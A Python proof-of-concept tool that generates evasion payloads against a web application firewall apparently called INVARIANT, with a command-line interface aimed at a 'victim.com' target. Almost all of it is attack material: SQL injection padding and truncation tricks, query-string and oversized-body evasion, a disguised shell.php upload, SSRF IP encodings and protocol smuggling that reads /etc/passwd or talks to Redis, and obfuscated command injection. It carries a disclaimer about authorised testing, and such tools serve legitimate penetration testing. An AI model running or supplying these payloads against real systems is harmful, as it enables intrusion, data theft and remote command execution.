#!/usr/bin/env python3
"""
INVARIANT Defense System — Bypass Proof of Concept

This script demonstrates bypass vectors against the INVARIANT security system:
1. SQL injection via comment injection + padding
2. Input length truncation attacks  
3. Static asset query string bypass
4. SSRF via IP encoding variations

Usage:
    python invariant_bypass_poc.py --target https://victim.com --vector sqli-comment
    python invariant_bypass_poc.py --target https://victim.com --vector ssrf-ip

DISCLAIMER: This tool is for authorized security testing only.
"""

import argparse
import sys
import urllib.parse
import requests
from typing import List, Dict, Optional


class InvariantBypassPOC:
    """Proof of concept bypass generator for INVARIANT defense system"""
    
    # INVARIANT constants from source analysis
    MAX_INPUT_SIZE = 4096  # sql-expression-evaluator.ts
    MAX_BODY_SIZE = 32768  # body-analysis.ts
    PATTERN_WINDOW_MS = 60000  # sql.ts
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def log(self, msg: str):
        if self.verbose:
            print(f"[*] {msg}")
    
    # ═══════════════════════════════════════════════════════════════════
    # SQL INJECTION BYPASS VECTORS
    # ═══════════════════════════════════════════════════════════════════
    
    def generate_sqli_comment_bypass(self, base_payload: str = "' OR 1=1--") -> List[str]:
        """
        BYPASS-001: SQL Comment Injection with Padding
        
        The SQL tokenizer skips block comments without validation.
        By padding the comment with junk data, we can:
        1. Push detection window if there's a length limit
        2. Hide malicious content in comment that may execute after */
        """
        payloads = []
        
        # Basic comment injection
        payloads.append(f"{base_payload}/*comment*/--")
        
        # Comment with size padding to approach MAX_INPUT
        padding_size = self.MAX_INPUT_SIZE - len(base_payload) - 20
        padding = "A" * padding_size
        payloads.append(f"{base_payload}/*{padding}*/--")
        
        # Nested comment attempt
        payloads.append(f"{base_payload}/*/**/{base_payload[2:]}--")
        
        # MySQL conditional comment (preserves content)
        payloads.append(f"{base_payload}/*!50000{base_payload[2:]}*/--")
        
        self.log(f"Generated {len(payloads)} SQLi comment bypass payloads")
        return payloads
    
    def generate_sqli_truncation_bypass(self, payload: str = "' OR 1=1--") -> List[str]:
        """
        BYPASS-002: Input Length Truncation Attack
        
        The evaluator truncates at MAX_INPUT (4096) characters.
        If malicious content is at the end, it gets cut off from detection
        but may still reach the database.
        """
        payloads = []
        
        # Push payload to end of truncation boundary
        padding = "A" * (self.MAX_INPUT_SIZE - len(payload) - 10)
        truncated_payload = f"{padding}{payload}"
        payloads.append(truncated_payload)
        
        # Just over the boundary
        padding_over = "B" * (self.MAX_INPUT_SIZE - 5)
        payloads.append(f"{padding_over}{payload}")
        
        self.log(f"Generated truncation bypass payloads (lengths: {[len(p) for p in payloads]})")
        return payloads
    
    def generate_sqli_whitespace_bypass(self) -> List[str]:
        """
        BYPASS-003: Whitespace Substitution
        
        SQL treats various characters as whitespace. INVARIANT's regex
        patterns may not account for all of them.
        """
        payloads = [
            "'/**/OR/**/1=1--",           # Comment as whitespace
            "'\tOR\t1=1--",               # Tab character
            "'\nOR\n1=1--",               # Newline
            "'%0bOR%0b1=1--",             # Vertical tab (URL encoded)
            "'%0cOR%0c1=1--",             # Form feed (URL encoded)
            "'%a0OR%a01=1--",             # Non-breaking space (MySQL)
        ]
        return payloads
    
    # ═══════════════════════════════════════════════════════════════════
    # EDGE SENSOR BYPASS VECTORS
    # ═══════════════════════════════════════════════════════════════════
    
    def generate_static_asset_bypass(self, endpoint: str, payload: str) -> List[str]:
        """
        BYPASS-004: Static Asset Query String Bypass
        
        Edge sensor skips signature scanning for static assets.
        Query strings are NOT analyzed even if the path has .css/.js extension.
        """
        encoded_payload = urllib.parse.quote(payload)
        
        urls = [
            f"{self.target}/style.css?x={encoded_payload}",
            f"{self.target}/script.js?data={encoded_payload}",
            f"{self.target}/image.png?id={encoded_payload}",
            f"{self.target}{endpoint}.css?query={encoded_payload}",
            f"{self.target}/api/data.json?callback={encoded_payload}",
        ]
        
        self.log(f"Generated {len(urls)} static asset bypass URLs")
        return urls
    
    def generate_body_size_bypass(self, payload: str) -> Dict:
        """
        BYPASS-005: Body Size Limit Bypass
        
        Body analyzer skips content > 32KB. Craft oversized body
        with malicious payload at the end.
        """
        # Create JSON with padding to exceed limit
        padding_size = self.MAX_BODY_SIZE - len(payload) + 100
        padding = "A" * padding_size
        
        body = f'{{"data":"{padding}{payload}"}}'
        
        self.log(f"Generated body size bypass (total: {len(body)} bytes)")
        
        return {
            'url': f"{self.target}/api/endpoint",
            'method': 'POST',
            'headers': {'Content-Type': 'application/json'},
            'body': body
        }
    
    def generate_multipart_bypass(self, payload: str) -> Dict:
        """
        BYPASS-006: Multipart Content-Type Bypass
        
        The multipart parser skips "file uploads" based on trivial check:
        if (part.includes('Content-Type:') && !part.includes('text/plain')) continue
        
        Bypass: Content-Type: text/plain; filename=shell.php
        """
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        
        body = f"""------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/plain; charset=utf-8

{payload}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary7MA4YWxkTrZu0gW--"""

        return {
            'url': f"{self.target}/upload",
            'method': 'POST',
            'headers': {'Content-Type': f'multipart/form-data; boundary={boundary}'},
            'body': body
        }
    
    # ═══════════════════════════════════════════════════════════════════
    # SSRF BYPASS VECTORS
    # ═══════════════════════════════════════════════════════════════════
    
    def generate_ssrf_ip_bypass(self, target_ip: str = "127.0.0.1") -> List[str]:
        """
        BYPASS-007: IP Address Encoding Bypass
        
        SSRF detection uses regex that doesn't cover all IP encoding schemes.
        """
        urls = []
        
        # Standard (detected)
        urls.append(f"http://{target_ip}/")
        
        # Octal notation (NOT detected)
        urls.append("http://0177.0.0.1/")  # 0177 = 127
        urls.append("http://017700000001/")  # Full octal
        
        # Short form (NOT detected)
        urls.append("http://127.1/")
        urls.append("http://127.0.1/")
        
        # Integer overflow (detected for some)
        urls.append("http://2130706433/")  # 127.0.0.1 as integer
        urls.append("http://0x7f000001/")  # Hex
        
        # Full IPv6 (NOT detected)
        urls.append("http://[0:0:0:0:0:0:0:1]/")
        urls.append("http://[::ffff:0:0:0:0:0:0:0:1]/")
        urls.append("http://[::ffff:127.0.0.1]/")
        
        # IPv6 with zone ID
        urls.append("http://[fe80::1%25lo]/")
        
        # DNS rebinding (requires external control)
        urls.append("http://attacker-controlled.example.com/")
        
        self.log(f"Generated {len(urls)} SSRF IP bypass URLs")
        return urls
    
    def generate_ssrf_protocol_bypass(self) -> List[str]:
        """
        BYPASS-008: Protocol Smuggling
        """
        return [
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/INFO",  # Redis
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO",  # Redis protocol
            "ldap://127.0.0.1:389/%0astats%0aquit",
            "tftp://127.0.0.1:69/test",
        ]
    
    # ═══════════════════════════════════════════════════════════════════
    # COMMAND INJECTION BYPASS VECTORS
    # ═══════════════════════════════════════════════════════════════════
    
    def generate_cmdi_bypass(self, command: str = "whoami") -> List[str]:
        """
        BYPASS-009: Command Injection Evasion
        
        RASP uses regex: /[;&|`\$]\s*(?:cat|ls|id|whoami|...)
        Various bypasses exist for this pattern.
        """
        payloads = [
            # $IFS bypass (space substitution)
            f";{command}\${{IFS}}",
            
            # Path globbing
            f"/???/{command[:3]}",
            
            # Newline separator (not in regex)
            f"\n{command}\n",
            
            # Case variation
            f";WhOaMi",
            f";{command.upper()}",
            
            # Hex escape
            "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",  # whoami in hex
            
            # Alternative separators
            f"|{command}",
            f"||{command}",
            f"&&{command}",
            
            # Backtick with obfuscation
            f"`{command}`",
            
            # Command substitution
            f"$({command})",
            
            # Quote fragmentation
            "w'h'o'a'm'i",
            
            # Variable expansion
            "${PATH:0:1}bin${PATH:0:1}whoami",  # /bin/whoami
        ]
        
        self.log(f"Generated {len(payloads)} command injection bypass payloads")
        return payloads
    
    # ═══════════════════════════════════════════════════════════════════
    # TESTING METHODS
    # ═══════════════════════════════════════════════════════════════════
    
    def test_payload(self, url: str, method: str = 'GET', 
                     headers: Optional[Dict] = None, 
                     data: Optional[str] = None) -> Dict:
        """Test a single payload and return response details"""
        try:
            if method == 'GET':
                resp = self.session.get(url, headers=headers, timeout=10)
            else:
                resp = self.session.post(url, headers=headers, data=data, timeout=10)
            
            return {
                'status_code': resp.status_code,
                'content_length': len(resp.content),
                'headers': dict(resp.headers),
                'blocked': 'X-Invariant-Action' in resp.headers,
                'action': resp.headers.get('X-Invariant-Action', 'none')
            }
        except requests.RequestException as e:
            return {'error': str(e)}
    
    def run_vector(self, vector: str, **kwargs):
        """Run a specific bypass vector"""
        print(f"\n{'='*60}")
        print(f"Testing vector: {vector}")
        print(f"{'='*60}\n")
        
        if vector == 'sqli-comment':
            payloads = self.generate_sqli_comment_bypass(kwargs.get('payload', "' OR 1=1--"))
            for i, p in enumerate(payloads[:3], 1):
                print(f"[{i}] Payload length: {len(p)}")
                print(f"    Sample: {p[:100]}...")
                
        elif vector == 'sqli-truncation':
            payloads = self.generate_sqli_truncation_bypass(kwargs.get('payload', "' OR 1=1--"))
            for i, p in enumerate(payloads, 1):
                print(f"[{i}] Payload length: {len(p)} bytes")
                print(f"    Exceeds MAX_INPUT: {len(p) > self.MAX_INPUT_SIZE}")
                
        elif vector == 'static-asset':
            endpoint = kwargs.get('endpoint', '/api/users')
            payload = kwargs.get('payload', "' OR 1=1--")
            urls = self.generate_static_asset_bypass(endpoint, payload)
            for i, url in enumerate(urls, 1):
                print(f"[{i}] {url[:80]}...")
                
        elif vector == 'body-size':
            payload = kwargs.get('payload', "' OR 1=1--")
            result = self.generate_body_size_bypass(payload)
            print(f"Method: {result['method']}")
            print(f"URL: {result['url']}")
            print(f"Body size: {len(result['body'])} bytes")
            print(f"Exceeds MAX_BODY_SIZE: {len(result['body']) > self.MAX_BODY_SIZE}")
            
        elif vector == 'ssrf-ip':
            urls = self.generate_ssrf_ip_bypass(kwargs.get('ip', '127.0.0.1'))
            for i, url in enumerate(urls, 1):
                print(f"[{i}] {url}")
                
        elif vector == 'cmdi':
            payloads = self.generate_cmdi_bypass(kwargs.get('command', 'whoami'))
            for i, p in enumerate(payloads, 1):
                print(f"[{i}] {p}")
                
        else:
            print(f"Unknown vector: {vector}")
            print(f"Available: sqli-comment, sqli-truncation, static-asset, body-size, ssrf-ip, cmdi")


def main():
    parser = argparse.ArgumentParser(
        description='INVARIANT Defense System Bypass POC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://victim.com --vector sqli-comment
  %(prog)s --target https://victim.com --vector ssrf-ip
  %(prog)s --target https://victim.com --vector static-asset --endpoint /api/users
  %(prog)s --target https://victim.com --vector body-size --payload "' OR 1=1--"
        """
    )
    parser.add_argument('--target', '-t', required=True, help='Target URL')
    parser.add_argument('--vector', '-v', required=True, 
                       choices=['sqli-comment', 'sqli-truncation', 'sqli-whitespace',
                               'static-asset', 'body-size', 'multipart',
                               'ssrf-ip', 'ssrf-protocol', 'cmdi'],
                       help='Bypass vector to test')
    parser.add_argument('--endpoint', '-e', default='/api/endpoint', help='API endpoint')
    parser.add_argument('--payload', '-p', help='Custom payload')
    parser.add_argument('--command', '-c', default='whoami', help='Command for cmdi tests')
    parser.add_argument('--verbose', '-V', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    poc = InvariantBypassPOC(args.target, args.verbose)
    
    kwargs = {
        'endpoint': args.endpoint,
        'payload': args.payload,
        'command': args.command
    }
    
    poc.run_vector(args.vector, **kwargs)
    
    print("\n" + "="*60)
    print("DISCLAIMER: This tool is for authorized security testing only.")
    print("Unauthorized access to computer systems is illegal.")
    print("="*60)


if __name__ == '__main__':
    main()
